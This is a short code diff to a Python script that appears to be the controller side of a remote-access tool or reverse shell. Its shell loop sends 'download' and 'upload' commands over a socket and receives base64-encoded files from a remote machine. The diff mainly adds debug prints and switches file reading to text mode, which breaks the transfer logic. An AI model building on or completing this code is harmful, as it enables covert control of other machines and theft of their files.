@@ -11,8 +11,11 @@ from termcolor import colored
 
 
 def s_send(data):
+    print(2)
     json_data = json.dumps(data)
+    print(3)
     sock.send(json_data.encode("utf-8"))
+    print(4)
 
 def s_recv():
     data = ""
@@ -37,9 +40,15 @@ def shell():
             except:
                 continue
         elif command[:8] == "download":
+            print(command[:8])
+            print(command[9:])
             try:
-                with open(command[9:], "rb") as fout:
+                with open(command[9:], "r") as fout:
+                    print(type(fout.read()))
+                    print(1)
+                    print(fout.read())
                     s_send(base64.b64encode(fout.read()))
+                    print(5)
             except:
                 print(colored("Download Failed !!!", "red"))
         elif command[:6] == "upload":
